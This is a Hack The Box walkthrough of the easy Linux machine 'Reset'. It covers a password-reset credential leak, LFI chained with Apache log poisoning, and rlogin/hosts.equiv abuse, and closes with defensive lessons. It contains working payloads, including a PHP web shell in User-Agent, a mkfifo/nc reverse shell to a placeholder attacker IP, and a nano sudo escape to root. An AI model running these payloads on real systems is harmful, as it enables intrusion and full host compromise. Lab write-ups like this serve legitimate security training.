---
title: 'Reset'
target: 'Hack The Box — Reset'
difficulty: 'easy'
date: 2025-09-15
summary: 'An HTB machine — scanning with nmap to find SSH (22), Apache (80) with an Admin Login page, and legacy r-services (512-514), exploiting a password reset endpoint that leaks the new admin password in its JSON response, authenticating to a log-viewer dashboard vulnerable to LFI via an unvalidated file parameter, chaining with Apache access-log poisoning (PHP in User-Agent header) for RCE as www-data, reading the user flag via adm group membership, pivoting to sadm by abusing a hosts.equiv trust misconfiguration with rlogin, recovering sadm''s sudo password from a tmux session running nano, then escalating to root via GTFOBins nano sudo escape.'
role: 'pentest'
tags: ['nmap', 'apache', 'password-reset', 'information-disclosure', 'lfi', 'log-poisoning', 'rce', 'rlogin', 'hosts-equiv', 'tmux', 'gtfobins', 'nano', 'sudo', 'privilege-escalation']
problem: 'Reset is an easy-rated Linux machine running SSH (22), Apache httpd 2.4.52 (80) with an admin login panel, and legacy r-services — rexecd (512), rlogind (513), and rshd (514). The web application has a password reset endpoint that returns the new plaintext password in its JSON response instead of emailing a token. The admin dashboard has an LFI vulnerability in its log-viewer file parameter that is not restricted server-side. Apache access.log records User-Agent headers verbatim, enabling log poisoning for RCE. The system has a hosts.equiv file granting passwordless rlogin access as sadm from any host, and sadm has a sudo rule allowing nano on /etc/firewall.sh.'
action: 'Ran nmap with OS detection and default scripts — 22/tcp (OpenSSH 8.9p1 Ubuntu), 80/tcp (Apache httpd 2.4.52 with Admin Login title), 512/tcp (netkit-rsh rexecd), 513/tcp (rlogind), 514/tcp (Netkit rshd). The legacy r-services on 512-514 flagged host-based trust authentication as a likely escalation vector. Browsed to port 80 — an Admin Login page with a Forgot Password modal that POSTs a username to reset_password.php. Submitted username=admin — the endpoint returned the new password in plaintext JSON: {"username":"admin","new_password":"9ab49143","timestamp":"..."}. Authenticated as admin with the leaked password, confirmed redirect to dashboard.php showing Logged in as admin. The dashboard presented a Select Log File dropdown (syslog, auth.log) POSTing a file parameter to dashboard.php. Tested with /var/log/apache2/access.log — the server returned the log contents, confirming LFI with no server-side path restriction. Poisoned the access log by sending a request with a PHP system() call as the User-Agent header. Upgraded to a full reverse shell payload in User-Agent: <?php system(''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f''); ?>. Started a netcat listener and triggered the LFI on the poisoned access.log — caught a shell as www-data. Upgraded with python3 PTY spawn. Checked id — www-data was in the adm group. Read /home/sadm/user.txt for the user flag. Checked /etc/hosts.equiv — found + sadm entry granting passwordless rlogin from any host. On the attacker machine, created a local sadm user and used rlogin -l sadm to connect — dropped into an authenticated shell as sadm with no password. Found a tmux session (sadm_session) running — attached and observed a sudo password being typed into nano: 7lE2PAfVHfjz4HpE. Ran sudo -l as sadm — (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh. Executed sudo nano /etc/firewall.sh, used Ctrl+R then Ctrl+X to open the Execute Command prompt, entered reset; sh 1>&0 2>&0 to spawn a root shell. Retrieved the root flag.'
outcome: 'Gained root access to the machine. The attack chain was password reset information disclosure for admin credentials, LFI chained with Apache log poisoning for RCE as www-data, hosts.equiv trust misconfiguration with rlogin for lateral movement to sadm, tmux session password leak, and GTFOBins nano sudo escape for root.'
draft: false
---

## Background

Reset is an easy-rated Linux machine built around a chain of web application logic flaws and a legacy authentication misconfiguration. The attack path moves through four distinct phases — a password reset endpoint that hands out admin credentials in plaintext, an LFI-to-log-poisoning chain for remote code execution, a `hosts.equiv` trust relationship exploitable via the legacy `rlogin` service for lateral movement, and a GTFOBins sudo escape through `nano` for root. The box is a clean walkthrough of how individually minor issues compound: a password leak becomes admin access, admin access exposes an LFI, the LFI becomes RCE through log poisoning, and forgotten legacy services bridge the gap between users.

---

## Enumeration

An nmap scan against the target reveals five open ports — SSH on 22, Apache on 80, and the legacy r-services suite on 512-514.

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp  open  http    Apache httpd 2.4.52 (Ubuntu) — "Admin Login"
512/tcp open  exec    netkit-rsh rexecd
513/tcp open  login   rlogind
514/tcp open  shell   Netkit rshd
```

The presence of `rexec`, `rlogin`, and `rsh` on ports 512-514 is unusual for a modern box and immediately suggests that host-based trust authentication (`.rhosts` / `hosts.equiv`) will be relevant later. The `PHPSESSID` cookie was flagged as missing the `httponly` flag.

Browsing to port 80 presents an **Admin Login** page (Bootstrap 3.3.7 themed) with a "Forgot Password?" modal that POSTs a username to `reset_password.php` via AJAX:

```html
<form id="resetPasswordForm">
    <input type="text" id="resetUsername" name="username" required>
    <button type="submit">Send Reset Email</button>
</form>
```

```javascript
$.ajax({
    url: 'reset_password.php',
    method: 'POST',
    data: { username: username },
    success: function(data) { ... }
});
```

---

## Password reset information disclosure

Rather than emailing a reset token, `reset_password.php` returns the new plaintext password directly in the JSON response — a critical logic flaw that requires no email verification and hands out admin credentials to anyone who can guess (or know) the username:

```bash
curl -X POST http://<MACHINE_IP>/reset_password.php \
     -d "username=admin" \
     -H "Content-Type: application/x-www-form-urlencoded"
```

```json
{"username":"admin","new_password":"9ab49143","timestamp":"2026-07-01 04:51:16"}
```

Authenticating with the leaked password confirms admin access — the session redirects to `dashboard.php` showing "Logged in as: admin":

```bash
curl -X POST http://<MACHINE_IP>/index.php \
     -d "username=admin&password=9ab49143" \
     -c cookies.txt -L
```

---

## Local file inclusion in dashboard.php

The admin dashboard presents a "Select Log File" dropdown offering `syslog` and `auth.log`, submitted via POST to `dashboard.php`:

```html
<select name="file">
    <option value="/var/log/syslog">syslog</option>
    <option value="/var/log/auth.log">auth.log</option>
</select>
```

The dropdown restricts the options client-side, but the `file` parameter is not validated server-side — any path readable by `www-data` can be supplied. Testing with Apache's access log:

```bash
curl -s -b cookies.txt -X POST http://<MACHINE_IP>/dashboard.php \
     -d "file=/var/log/apache2/access.log"
```

The server returns the full contents of `/var/log/apache2/access.log`, confirming an LFI vulnerability. The choice of `access.log` is deliberate — it's present on virtually every Apache install at a predictable path, and critically, it records request data the attacker controls (URL, headers like User-Agent). That combination of a guessable path and attacker-controlled content makes it the natural target for log poisoning.

---

## Apache log poisoning — remote code execution

Since `access.log` records the `User-Agent` header verbatim, and the LFI can include that log file through PHP, a classic log poisoning chain applies: inject PHP into the User-Agent header so Apache writes it into `access.log` unsanitized, then use the LFI to include the poisoned log, causing the PHP interpreter to execute the injected payload.

First, a proof-of-concept to confirm execution by injecting a simple `system()` call as the User-Agent:

```bash
curl -v -b cookies.txt \
     -H 'User-Agent: <?php system($_GET["cmd"]); ?>' \
     http://<MACHINE_IP>/dashboard.php
```

Triggering inclusion of the poisoned log via the dashboard's log-viewer POST confirmed command execution. Upgrading to a full reverse shell — the payload is delivered via the User-Agent header, writing it into `access.log`:

```bash
curl -b cookies.txt \
     -H "User-Agent: <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 4444 >/tmp/f'); ?>" \
     http://<MACHINE_IP>/dashboard.php
```

Starting a listener and triggering the LFI to include the now-poisoned `access.log`:

```bash
nc -lvnp 4444
```

```bash
curl -v -L -b cookies.txt \
     -X POST http://<MACHINE_IP>/dashboard.php \
     -d "file=/var/log/apache2/access.log"
```

The `system()` call fires as the page renders, spawning the reverse shell:

```
whoami
www-data
```

A Python PTY upgrade stabilized the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Foothold established as `www-data`.

---

## User flag

Checking group membership reveals `www-data` is in the `adm` group, which grants read access to log files and, more importantly, to the user's home directory:

```
www-data@reset:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
```

```
www-data@reset:/home/sadm$ cat user.txt
```

The user flag was retrieved.

---

## Lateral movement — hosts.equiv trust and rlogin

The r-services found during enumeration (ports 512-514) pointed toward legacy host-based authentication. Checking `/etc/hosts.equiv` confirmed the misconfiguration:

```
www-data@reset:/home/sadm$ cat /etc/hosts.equiv
# /etc/hosts.equiv: list of hosts and users that are granted "trusted" r-command access
- root
- local
+ sadm
```

The `+ sadm` entry means **any remote host** can `rlogin` as the local user `sadm` without a password, provided the connecting client's username matches. On the attacker machine, creating a local `sadm` user and connecting via `rlogin`:

```bash
sudo useradd -m sadm
sudo passwd sadm
sudo su - sadm
rlogin -l sadm <MACHINE_IP>
```

This dropped straight into an authenticated shell as `sadm` — no password required, purely due to the `hosts.equiv` trust misconfiguration:

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-140-generic x86_64)

sadm@reset:~$ id
uid=1001(sadm) gid=1001(sadm) groups=1001(sadm)
```

---

## Privilege escalation — tmux password leak and nano sudo escape

A pre-existing tmux session was found running under sadm's account:

```
sadm@reset:~$ tmux ls
sadm_session: 1 windows (created Wed Jul  1 04:40:01 2026)
```

Attaching to it (`tmux a -t sadm_session`) revealed a sudo password being typed into a nano session: **7lE2PAfVHfjz4HpE**. Checking sudo privileges:

```
sadm@reset:~$ sudo -l
Matching Defaults entries for sadm on reset:
    env_reset, timestamp_timeout=-1, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty, !syslog

User sadm may run the following commands on reset:
    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
```

`nano` is a listed GTFOBins binary for sudo privilege escalation via its command-execution feature:

```bash
sudo /usr/bin/nano /etc/firewall.sh
```

Inside the editor, pressing `Ctrl+R` (Insert file) then `Ctrl+X` (Execute a command) opens an "Execute Command" prompt. Entering `reset; sh 1>&0 2>&0` spawns an interactive root shell in place of nano's file-insert operation:

```
# whoami
root
# cat /root/root_*.txt
```

The root flag was retrieved.

---

## What I took from this

The password reset flaw on Reset is as basic as information disclosure gets — the endpoint returns the new password in its response body instead of sending it to a verified email address. It's the kind of bug that exists because the developer built the reset flow for convenience during development and never replaced it with a proper token-based mechanism. The fix is straightforward: generate a time-limited token, send it to the registered email, and never include credentials in API responses. What makes it impactful here is that it's the first domino — without admin access, the LFI in the dashboard is unreachable.

The LFI-to-log-poisoning chain is a textbook technique worth internalizing. The LFI alone only reads files, but `access.log` turns it into code execution because Apache writes attacker-controlled input (the User-Agent header) into a file that the LFI can include through PHP. The defense is server-side allowlisting of the `file` parameter — the dropdown already limits it to two values, but that restriction lives only in the HTML. A simple array check on the backend (`if (!in_array($file, ['/var/log/syslog', '/var/log/auth.log']))`) would have killed the entire chain.

The `hosts.equiv` misconfiguration is a reminder that legacy services are often the weakest link on a system. The `+ sadm` entry effectively says "trust any host in the world to authenticate as sadm" — it's the network equivalent of leaving a door unlocked because the lock is old and inconvenient. The r-services suite (`rexec`, `rlogin`, `rsh`) predates SSH and has no encryption, no key-based authentication, and relies entirely on IP-based trust that's trivially spoofable. These services should be disabled entirely on any modern system. The `nano` sudo escape is standard GTFOBins — any text editor with command execution capabilities (`nano`, `vim`, `less`, `man`) becomes a privilege escalation vector when allowed via sudo, because the editor's built-in shell escape runs with the elevated privileges. Restricting sudo to specific files doesn't help when the binary itself can spawn a shell.
